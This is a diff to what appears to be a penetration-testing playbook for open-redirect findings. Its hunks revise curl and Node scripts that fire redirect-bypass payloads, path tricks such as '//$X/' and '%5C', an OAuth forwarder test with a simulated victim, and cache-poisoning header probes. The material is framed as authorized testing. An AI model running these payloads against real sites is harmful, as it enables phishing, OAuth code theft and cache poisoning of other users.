@@ -165,7 +165,7 @@ target's hosts) → RDR-010 (per host name behind a cache).
 
 | | |
 |---|---|
-| **Severity** | Low standalone, as RDR-001 (None where `open-redirect` is excluded); the bypass is what RDR-006 to RDR-009 need when the plain value is refused |
+| **Severity** | Low standalone, as RDR-001 (None where `open-redirect` is excluded); Medium to High as the link that lets RDR-006, RDR-007, RDR-008 or RDR-009 through when the plain value is refused |
 | **Requires** | redirect-param |
 | **Excluded by** | — |
 | **Unit** | deployment |
@@ -233,20 +233,19 @@ target's hosts) → RDR-010 (per host name behind a cache).
   https%3A%2F%2F$X%3F%40$OK%2F
   https%3A%2F%2Frdr002$OK%2F
   EOF
-  while IFS= read -r v; do
-    printf '%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "$Q$v")" "$v"; sleep "$W"
-  done < "$D/values.txt" > "$D/results.tsv"
-  for v in "%2Frdr002&$P=https%3A%2F%2F$X%2Frdr002-hpp1" "https%3A%2F%2F$X%2Frdr002-hpp2&$P=%2Frdr002"; do   # duplicated parameter
-    printf '%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "$Q$v")" "$v"; sleep "$W"
-  done >> "$D/results.tsv"
+  # fields are separated by \x1f, not a tab: a bypass can put a raw tab into Location itself
+  rq(){ r=$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}' "$Q$1"); printf '%s\x1f%s\x1f%s\n' "${r%% *}" "${r#* }" "$1"; sleep "$W"; }
+  while IFS= read -r v; do rq "$v"; done < "$D/values.txt" > "$D/results.txt"
+  rq "%2Frdr002&$P=https%3A%2F%2F$X%2Frdr002-hpp1" >> "$D/results.txt"      # duplicated parameter, both orders
+  rq "https%3A%2F%2F$X%2Frdr002-hpp2&$P=%2Frdr002" >> "$D/results.txt"
   # where a browser goes for each Location: Node's URL class is the WHATWG parser, no request is sent
   node -e '
   const fs = require("fs"), [f, b, x] = process.argv.slice(1);
   for (const line of fs.readFileSync(f, "utf8").split("\n").filter(Boolean)) {
-    const [code, loc, v] = line.split("\t"); let h = "-";
+    const [code, loc, v] = line.split("\x1f"); let h = "-";
     if (loc) try { h = new URL(loc, b).hostname } catch (e) { h = "(unparsable)" }
     console.log((h === x || h.endsWith("." + x) ? "HIT " : "    ") + code + " " + h.padEnd(40) + " " + v);
-  }' "$D/results.tsv" "$Q" "$X" | tee "$D/verdict.txt" | grep '^HIT'
+  }' "$D/results.txt" "$Q" "$X" | tee "$D/verdict.txt" | grep '^HIT'
   ```
   Open each `HIT` value in the scriptable browser as the victim would receive it (`"$Q<value>"`) and keep the
   ones that land on `$X`.
@@ -291,21 +290,23 @@ target's hosts) → RDR-010 (per host name behind a cache).
   D="$E/evidence/$H/RDR-003"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
   # a real directory from the crawl gives a directory-slash redirect something to act on
   DIR=$(grep -ohE "https?://$H/[A-Za-z0-9_-]+/" "$E/recon/$H/"*.txt | awk -F/ '{print $4}' | sort | uniq -c | sort -rn | awk 'NR==1{print $2}')
+  # fields are separated by \x1f, not a tab: a decoded %09 can put a raw tab into Location itself
+  rq(){ r=$(curl -sS -g --path-as-is "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}' "$1"); printf '%s\x1f%s\x1f%s\n' "${r%% *}" "${r#* }" "$1"; sleep "$W"; }
   for p in "//$X/" "//$X/%2e%2e%2f" "//$X/%2e%2e%2f$DIR" "/%2F$X/" "/%2F%2F$X/" "/%5C$X/" "/%5C%5C$X/" "/%09/$X/" \
            "///$X/" "////$X/" "/https:/$X/" "/https://$X/" "/https:%2F%2F$X/" "/@$X/" "/;@$X/" "///;@$X/" "/.$X/" \
            "/$DIR//$X/" "/$DIR/%2F%2F$X/" "/$DIR/%5C$X/" "/$DIR/..%2F%2F$X/"; do
-    printf '%s\t%s\n' "$(curl -sS -g --path-as-is "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "$T$p")" "$T$p"; sleep "$W"
-  done > "$D/results.tsv"
-  printf '%s\t%s\n' "$(curl -sS -g --path-as-is "${HDR[@]}" -o /dev/null -w '%{http_code}\t%header{location}' "http://$H//$X/")" "http://$H//$X/" >> "$D/results.tsv"
+    rq "$T$p"
+  done > "$D/results.txt"
+  rq "http://$H//$X/" >> "$D/results.txt"           # the port-80 upgrade often copies the raw path
   # where the browser goes for each Location, and whether a browser would send that path unchanged at all
   node -e '
   const fs = require("fs"), [f, x] = process.argv.slice(1);
   for (const line of fs.readFileSync(f, "utf8").split("\n").filter(Boolean)) {
-    const [code, loc, req] = line.split("\t"); let h = "-";
+    const [code, loc, req] = line.split("\x1f"); let h = "-";
     if (loc) try { h = new URL(loc, req).hostname } catch (e) { h = "(unparsable)" }
     const u = new URL(req), asked = req.replace(/^https?:\/\/[^/]+/, ""), sent = u.pathname + u.search;
     console.log((h === x || h.endsWith("." + x) ? "HIT " : "    ") + code + " " + h.padEnd(30) + " " + req + (sent === asked ? "" : "  [browser sends " + sent + "]"));
-  }' "$D/results.tsv" "$X" | tee "$D/verdict.txt" | grep '^HIT'
+  }' "$D/results.txt" "$X" | tee "$D/verdict.txt" | grep '^HIT'
   ```
 - **Proof:** the link exactly as a browser sends it (its verdict line has no `[browser sends …]` note), the raw
   30x whose `Location` resolves to `$X`, and the landing in a browser.
@@ -630,8 +631,8 @@ target's hosts) → RDR-010 (per host name behind a cache).
     printf '%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%{size_download}\t%header{location}' "$(swap "$V")")" "$V"; sleep "$W"
   done | tee "$D/accepted.txt"                     # accepted answers like the first line, refused like the second
   # 3. does the forwarder pass a query on? (a fragment never reaches it; the browser keeps it across the 30x)
-  case "$FW" in *\?*) S='&';; *) S='?';; esac
-  curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}\n' "${FW}${S}code=rdr008marker"
+  case "$FW" in *\?*) SEP='&';; *) SEP='?';; esac
+  curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}\n' "${FW}${SEP}code=rdr008marker"
   # 4. the victim (our own test identity, signed in at the provider in the browser) opens our authorize URL with the forwarder in it
   cat > "$D/victim.js" <<'JS'
   // victim.js <provider storage-state file> <url>: open the URL as the signed-in victim and print where the browser ends
@@ -744,6 +745,7 @@ target's hosts) → RDR-010 (per host name behind a cache).
   for cb in "rdr010a$RANDOM" "rdr010b$RANDOM"; do for n in 1 2; do
     curl -sS "${HDR[@]}" -o /dev/null -D "$D/key.$cb.$n" "$T$P?$cb=1"; echo "$cb try $n: $(cc "$D/key.$cb.$n")"; sleep "$W"; done; done | tee "$D/key.txt"
   # wanted: a miss then a hit for each buster. A hit on a buster's first try means the query is not keyed: stop here.
+  # Two misses for both busters: this path is not cached at all; pick another redirecting path before going on.
   # 1. one fresh buster per header: the request with our host, then the same URL from a clean client without it
   for hv in "X-Forwarded-Host: $X" "X-Host: $X" "X-Forwarded-Server: $X" "X-Original-Host: $X" "X-HTTP-Host-Override: $X" "Forwarded: host=$X"; do
     cb="rdr010$RANDOM"
